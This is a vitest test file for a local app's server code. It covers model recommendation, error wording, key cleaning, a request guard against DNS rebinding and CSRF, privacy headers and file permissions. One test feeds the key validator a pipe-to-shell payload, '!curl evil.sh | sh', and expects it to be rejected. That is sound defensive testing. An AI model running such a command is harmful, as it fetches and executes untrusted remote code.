// Model choice, error wording, key hygiene, the request guard, and the desktop engine closure.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { NextRequest } from "next/server";
import { afterEach, describe, expect, it } from "vitest";
import { mergeProfile } from "@/src/core/profile";
import { cleanKey } from "@/src/server/connections";
import { DATA_DIR, writeJson } from "@/src/server/store";
import { describeModelError, isAuthFailure, providerMessage } from "@/src/server/errors";
import { recommendedModel } from "@/src/server/llm";
import { proxy } from "@/proxy";
// plain .mjs build helper (allowJs types it)
import { dependencyClosure } from "@/scripts/server-deps.mjs";

const m = (provider: string, ...ids: string[]) => ids.map((id) => ({ provider, id, reasoning: true }));

describe("recommendedModel", () => {
  it("prefers the newest balanced model per provider, not the priciest or a dated snapshot", () => {
    expect(recommendedModel("anthropic", m("anthropic", "claude-opus-5-5", "claude-sonnet-4-5-20250929", "claude-sonnet-5", "claude-sonnet-5-5", "claude-haiku-5-5"))?.id).toBe("claude-sonnet-5-5");
    expect(recommendedModel("openai", m("openai", "gpt-6-astra", "gpt-6-sol", "gpt-6.1-sol", "gpt-6.1-terra", "gpt-5.5"))?.id).toBe("gpt-6.1-sol");
    expect(recommendedModel("github-copilot", m("github-copilot", "gpt-6.1-sol", "claude-sonnet-4.6", "claude-sonnet-5.5"))?.id).toBe("claude-sonnet-5.5");
    expect(recommendedModel("google", m("google", "gemini-4-argon", "gemini-pro-latest", "gemini-2.5-pro"))?.id).toBe("gemini-pro-latest");
    expect(recommendedModel("openrouter", m("openrouter", "moonshotai/kimi-k2.7-code", "~anthropic/claude-sonnet-latest"))?.id).toBe("~anthropic/claude-sonnet-latest");
  });
  it("falls back to a reasoning model, then the first one, for providers it has no taste for", () => {
    const list = [
      { provider: "x", id: "small", reasoning: false },
      { provider: "x", id: "thinker", reasoning: true },
    ];
    expect(recommendedModel("x", list)?.id).toBe("thinker");
    expect(recommendedModel("x", [list[0]])?.id).toBe("small");
    expect(recommendedModel("nobody", list)).toBeUndefined();
  });
});

describe("describeModelError", () => {
  it("turns provider failures into one actionable sentence", () => {
    expect(describeModelError('401 {"type":"error","error":{"type":"authentication_error","message":"invalid x-api-key"}}', "Anthropic")).toMatchObject({
      action: "connect",
      message: expect.stringContaining("Anthropic didn't accept"),
    });
    expect(describeModelError("429 rate_limit_exceeded: slow down", "OpenAI").message).toMatch(/usage or billing limit/);
    expect(describeModelError("fetch failed: getaddrinfo ENOTFOUND api.openai.com", "OpenAI").message).toMatch(/Couldn't reach OpenAI/);
    expect(describeModelError("No AI model is connected yet. Connect one…").action).toBe("connect");
    expect(describeModelError("Cannot find module '/opt/LifeHarness/x.js'").message).toMatch(/Reinstall/);
    expect(describeModelError("something odd").message).toBe("something odd");
  });
  it("keeps only the human part of a provider's JSON error", () => {
    expect(providerMessage('401 {"type":"error","error":{"type":"authentication_error","message":"invalid x-api-key"},"request_id":"req_1"}')).toBe("invalid x-api-key");
    expect(providerMessage("503 upstream connect error")).toBe("upstream connect error");
  });
  it("recognises auth failures but not other 4xx", () => {
    expect(isAuthFailure("Incorrect API key provided: sk-abc")).toBe(true);
    expect(isAuthFailure("API key not valid. Please pass a valid API key.")).toBe(true);
    expect(isAuthFailure("403 Your organization must be verified to use this model")).toBe(false);
  });
});

describe("cleanKey", () => {
  it("trims and unquotes a pasted key", () => {
    expect(cleanKey('  "sk-ant-api03-abc_DEF-123"\n')).toBe("sk-ant-api03-abc_DEF-123");
  });
  it("refuses shell-command keys (pi runs keys starting with ! as commands) and multi-token pastes", () => {
    expect(() => cleanKey("!curl evil.sh | sh")).toThrow();
    expect(() => cleanKey("sk-one sk-two")).toThrow();
    expect(() => cleanKey("   ")).toThrow();
  });
});

describe("proxy (request guard)", () => {
  const env = { ...process.env };
  afterEach(() => {
    process.env = { ...env };
  });
  const req = (url: string, init: { method?: string; headers?: Record<string, string> } = {}) =>
    new NextRequest(url, { method: init.method ?? "GET", headers: { host: new URL(url).host, ...init.headers } });
  const status = (r: Response) => r.status;

  it("only answers loopback hosts (DNS rebinding)", () => {
    expect(status(proxy(req("http://127.0.0.1:3210/api/state")))).toBe(200);
    expect(status(proxy(req("http://localhost:3210/today")))).toBe(200);
    expect(status(proxy(req("http://evil.example:3210/api/state")))).toBe(403);
    expect(status(proxy(req("http://192.0.2.10:3210/api/state")))).toBe(403); // a LAN address (RFC 5737 example)
    process.env.LIFEHARNESS_ALLOW_HOSTS = "box.lan:3210";
    expect(status(proxy(req("http://box.lan:3210/api/state")))).toBe(200);
  });
  it("blocks cross-site writes (CSRF) but not same-origin ones", () => {
    const post = (headers: Record<string, string>) => status(proxy(req("http://127.0.0.1:3210/api/connections/login", { method: "POST", headers })));
    expect(post({ origin: "http://127.0.0.1:3210", "sec-fetch-site": "same-origin" })).toBe(200);
    expect(post({ origin: "https://evil.example", "sec-fetch-site": "cross-site" })).toBe(403);
    expect(post({ origin: "https://evil.example" })).toBe(403);
    expect(post({ origin: "null" })).toBe(403);
    expect(post({})).toBe(200); // curl etc. (no browser): local processes can read the files anyway
  });
  it("in the desktop app, requires the per-launch secret everywhere except the health check", () => {
    process.env.LIFEHARNESS_API_SECRET = "s3cret";
    expect(status(proxy(req("http://127.0.0.1:4000/api/state")))).toBe(403);
    expect(status(proxy(req("http://127.0.0.1:4000/today", { headers: { "x-lifeharness-secret": "nope" } })))).toBe(403);
    expect(status(proxy(req("http://127.0.0.1:4000/api/state", { headers: { "x-lifeharness-secret": "s3cret" } })))).toBe(200);
    expect(status(proxy(req("http://127.0.0.1:4000/api/health")))).toBe(200);
  });
});

describe("privacy", () => {
  it("adds a CSP that keeps the page on its own server, plus anti-framing headers", () => {
    const res = proxy(new NextRequest("http://127.0.0.1:3210/today", { headers: { host: "127.0.0.1:3210" } }));
    const csp = res.headers.get("content-security-policy") ?? "";
    expect(csp).toContain("connect-src 'self'");
    expect(csp).toContain("img-src 'self' data: blob:");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(res.headers.get("referrer-policy")).toBe("no-referrer");
  });
  it("writes life data readable by the owner only", () => {
    writeJson("privacy-test.json", { ok: true });
    expect(fs.statSync(path.join(DATA_DIR, "privacy-test.json")).mode & 0o777).toBe(0o600);
    expect(fs.statSync(DATA_DIR).mode & 0o077).toBe(0);
  });
  it("never stores a precise location (about 1 km is enough for prayer times)", () => {
    const { profile } = mergeProfile({}, { location: { city: "X", lat: 12.345678, lon: -98.765432 } });
    expect(profile.location).toMatchObject({ lat: 12.35, lon: -98.77 });
  });
});

describe("desktop engine closure", () => {
  it("includes the lazily loaded provider SDKs that output tracing missed", () => {
    const root = path.resolve(__dirname, "..");
    const names = (dependencyClosure(root) as string[]).map((d) => path.relative(path.join(root, "node_modules"), d));
    for (const pkg of ["@earendil-works/pi-ai", "@earendil-works/pi-coding-agent", "@anthropic-ai/sdk", "openai", "@google/genai", "@aws-sdk/client-bedrock-runtime", "@smithy/node-http-handler", "http-proxy-agent"]) {
      expect(names).toContain(pkg);
    }
    expect(fs.existsSync(os.tmpdir())).toBe(true);
  });
});
